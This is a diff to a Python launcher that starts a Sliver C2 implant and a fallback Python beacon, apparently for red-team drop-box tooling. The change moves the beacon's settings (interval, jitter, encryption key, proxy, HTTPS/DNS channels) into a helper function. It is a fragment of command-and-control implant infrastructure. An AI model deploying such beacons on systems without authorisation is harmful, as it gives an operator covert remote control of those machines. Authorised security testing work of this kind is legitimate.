@@ -179,19 +179,9 @@ def main():
                                    sliver_cfg.get("implant_path"))
 
             if not sliver_started and fallback_cfg.get("enabled"):
-                from software.c2.beacon import Beacon
-                fb_config = {
-                    "c2": {
-                        "beacon_interval_seconds": c2_cfg.get("beacon_interval_seconds", 300),
-                        "jitter_percent": c2_cfg.get("jitter_percent", 20),
-                        "encryption_key": c2_cfg.get("encryption_key", ""),
-                        "proxy": c2_cfg.get("proxy", {}),
-                        "https": fallback_cfg.get("https", {}),
-                        "dns": fallback_cfg.get("dns", {}),
-                        "dropbox": True,
-                    }
-                }
-                beacon = Beacon(fb_config)
+                from software.c2.beacon import (Beacon,
+                                                beacon_config_from_fallback)
+                beacon = Beacon(beacon_config_from_fallback(c2_cfg))
                 beacon.start()
                 components.append(("beacon", beacon))
                 logger.info("Python fallback beacon started")
